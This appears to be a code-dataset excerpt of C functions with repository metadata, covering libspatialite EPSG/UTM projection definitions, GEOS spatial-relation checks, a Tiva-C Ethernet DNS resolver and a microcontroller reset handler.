\"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTHO\");\n    add_srs_wkt (p, 11,\n        \"RITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"N\");\n    add_srs_wkt (p, 12,\n        \"orthing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32547\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32548, \"epsg\", 32548,\n        \"WGS 72BE / UTM zone 48S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=48 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 48S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",105],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32548\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32549, \"epsg\", 32549,\n        \"WGS 72BE / UTM zone 49S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=49 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 49S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",111],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32549\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32550, \"epsg\", 32550,\n        \"WGS 72BE / UTM zone 50S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=50 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 50S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",117],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32550\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32551, \"epsg\", 32551,\n        \"WGS 72BE / UTM zone 51S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=51 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 51S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",123],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32551\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32552, \"epsg\", 32552,\n        \"WGS 72BE / UTM zone 52S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=52 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 52S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",129],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32552\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32553, \"epsg\", 32553,\n        \"WGS 72BE / UTM zone 53S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=53 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 53S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",135],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32553\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32554, \"epsg\", 32554,\n        \"WGS 72BE / UTM zone 54S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=54 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 54S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",141],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32554\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32555, \"epsg\", 32555,\n        \"WGS 72BE / UTM zone 55S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=55 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 55S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",147],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32555\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32556, \"epsg\", 32556,\n        \"WGS 72BE / UTM zone 56S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=56 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 56S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",153],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32556\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32557, \"epsg\", 32557,\n        \"WGS 72BE / UTM zone 57S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=57 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 57S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",159],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32557\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32558, \"epsg\", 32558,\n        \"WGS 72BE / UTM zone 58S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=58 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 58S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",165],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32558\\\"]]\");\n}", "path": "AdvancedMap3D\\jni\\libspatialite-4.1.0\\src\\srsinit\\epsg_inlined_39.c", "repo_name": "nutiteq/hellomap3d", "stars": 151, "license": "mit", "language": "c", "size": 253418}
{"docstring": "/* end GEOS_ADVANCED */\n", "func_signal": "GAIAGEO_DECLARE int\ngaiaGeomCollWithin (gaiaGeomCollPtr geom1, gaiaGeomCollPtr geom2)", "code": "{\n/* checks if GEOM-1 is completely contained within GEOM-2 */\n    int ret;\n    GEOSGeometry *g1;\n    GEOSGeometry *g2;\n    if (!geom1 || !geom2)\n\treturn -1;\n    if (gaiaIsToxic (geom1) || gaiaIsToxic (geom2))\n\treturn -1;\n\n/* quick check based on MBRs comparison */\n    if (!splite_mbr_within (geom1, geom2))\n\treturn 0;\n\n    g1 = gaiaToGeos (geom1);\n    g2 = gaiaToGeos (geom2);\n    ret = GEOSWithin (g1, g2);\n    GEOSGeom_destroy (g1);\n    GEOSGeom_destroy (g2);\n    return ret;\n}", "path": "AdvancedMap3D\\jni\\libspatialite-4.1.0\\src\\gaiageo\\gg_relations.c", "repo_name": "nutiteq/hellomap3d", "stars": 151, "license": "mit", "language": "c", "size": 253418}
{"docstring": "/* only if GEOS advanced features are enable */\n", "func_signal": "GAIAGEO_DECLARE int\ngaiaGeomCollPreparedCrosses (void *p_cache, gaiaGeomCollPtr geom1,\n\t\t\t     unsigned char *blob1, int size1,\n\t\t\t     gaiaGeomCollPtr geom2, unsigned char *blob2,\n\t\t\t     int size2)", "code": "{\n/* checks if two Geometries do \"spatially crosses\" */\n    int ret;\n    struct splite_internal_cache *cache =\n\t(struct splite_internal_cache *) p_cache;\n    GEOSPreparedGeometry *gPrep;\n    GEOSGeometry *g1;\n    GEOSGeometry *g2;\n    gaiaGeomCollPtr geom;\n    if (!geom1 || !geom2)\n\treturn -1;\n    if (gaiaIsToxic (geom1) || gaiaIsToxic (geom2))\n\treturn -1;\n\n/* quick check based on MBRs comparison */\n    if (!splite_mbr_overlaps (geom1, geom2))\n\treturn 0;\n\n/* handling the internal GEOS cache */\n    if (evalGeosCache\n\t(cache, geom1, blob1, size1, geom2, blob2, size2, &gPrep, &geom))\n      {\n\t  g2 = gaiaToGeos (geom);\n\t  ret = GEOSPreparedCrosses (gPrep, g2);\n\t  GEOSGeom_destroy (g2);\n\t  return ret;\n      }\n\n    g1 = gaiaToGeos (geom1);\n    g2 = gaiaToGeos (geom2);\n    ret = GEOSCrosses (g1, g2);\n    GEOSGeom_destroy (g1);\n    GEOSGeom_destroy (g2);\n    return ret;\n}", "path": "AdvancedMap3D\\jni\\libspatialite-4.1.0\\src\\gaiageo\\gg_relations.c", "repo_name": "nutiteq/hellomap3d", "stars": 151, "license": "mit", "language": "c", "size": 253418}
{"docstring": "//*****************************************************************************\n//\n// Handler function when the DNS server gets a response or times out.\n//\n// \\param pcName is DNS server name.\n//\n// This function is called when the DNS server resolves an IP or times out.\n// If the DNS server returns an IP structure that is not NULL, add the IP to\n// to the g_sEnet.sServerIP IP structure.\n//\n// \\return None.\n//\n//*****************************************************************************\n", "func_signal": "int32_t\nEthClientDNSResolve(const char *pcName)", "code": "{\n    err_t iRet;\n\n    if(HWREGBITW(&g_sEnet.ui32Flags, FLAG_TIMER_DNS_EN))\n    {\n        return(ERR_INPROGRESS);\n    }\n\n    //\n    // Set DNS config timer to true.\n    //\n    HWREGBITW(&g_sEnet.ui32Flags, FLAG_TIMER_DNS_EN) = 1;\n\n    //\n    // Initialize the host name IP address found flag to false.\n    //\n    HWREGBITW(&g_sEnet.ui32Flags, FLAG_DNS_ADDRFOUND) = 0;\n\n    //\n    // Resolve host name.\n    //\n    iRet = dns_gethostbyname(pcName, &g_sEnet.sServerIP, DNSServerFound, 0);\n\n    //\n    // If ERR_OK is returned, the local DNS table resolved the host name.  If\n    // ERR_INPROGRESS is returned, the DNS request has been queued and will be\n    // sent to the DNS server.\n    //\n    if(iRet == ERR_OK)\n    {\n        //\n        // Stop calling the DNS timer function.\n        //\n        HWREGBITW(&g_sEnet.ui32Flags, FLAG_TIMER_DNS_EN) = 0;\n    }\n\n    //\n    // Return host name not found.\n    //\n    return(iRet);\n}", "path": "boards\\ek-tm4c1294xl\\enet_weather\\eth_client.c", "repo_name": "yuvadm/tiva-c", "stars": 164, "license": "None", "language": "c", "size": 77807}
{"docstring": "//*****************************************************************************\n//\n// This is the code that gets called when the processor first starts execution\n// following a reset event.  Only the absolutely necessary set is performed,\n// after which the application supplied entry() routine is called.  Any fancy\n// actions (such as making decisions based on the reset cause register, and\n// resetting the bits in that register) are left solely in the hands of the\n// application.\n//\n//*****************************************************************************\n", "func_signal": "void\nResetISR(void)", "code": "{\n    //\n    // Jump to the CCS C initialization routine.  This will enable the\n    // floating-point unit as well, so that does not need to be done here.\n    //\n    __asm(\"    .global _c_int00\\n\"\n          \"    b.w     _c_int00\");\n}", "path": "boards\\ek-tm4c1294xl\\mpu_fault\\startup_ccs.c", "repo_name": "yuvadm/tiva-c", "stars": 164, "license": "None", "language": "c", "size": 77807}
